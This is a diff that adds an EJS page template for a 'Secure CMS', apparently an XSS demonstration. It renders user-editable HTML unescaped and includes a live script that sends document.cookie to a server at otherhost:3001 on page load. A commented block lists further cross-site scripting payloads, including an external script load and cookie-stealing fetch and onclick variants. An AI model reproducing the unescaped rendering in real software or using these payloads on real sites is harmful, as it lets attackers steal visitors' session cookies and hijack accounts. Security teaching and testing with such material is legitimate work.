@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+
+<head></head>
+
+<body>
+    <h1>Secure CMS</h1>
+
+    <!-- User login -->
+    <div id="menu">
+        <% if (!user) { %>
+        <p>Please <a href="/login">login</a> with account to edit the content.</p>
+        <% } else { %>
+        <p><a href="/edit">Edit</a> the HTML or <a href="/logout">logout.</a></p>
+        <% } %>
+    </div>
+
+    <!-- Editable HTML -->
+    <div id="content">
+        <%- html %>
+    </div>
+
+    <script>fetch("http://otherhost:3001/cookie.txt?cookie=" + document.cookie).then(res => res.text()).then(txt => alert(txt))</script>
+
+
+<!-- Sample injection
+<script type="text/javascript" src="http://otherhost:3001/script.js"></script>
+<script>alert(document.cookie);</script>
+<script>fetch("http://otherhost:3001/cookie.txt?cookie=" + document.cookie).then(res => res.text()).then(txt => alert(txt))</script>
+<a onclick="fetch('http://otherhost:3001/cookie.txt?cookie=' + document.cookie).then(res => res.text()).then(txt => alert(txt))">link</a>
+-->
+
+</body>
+
+</html>
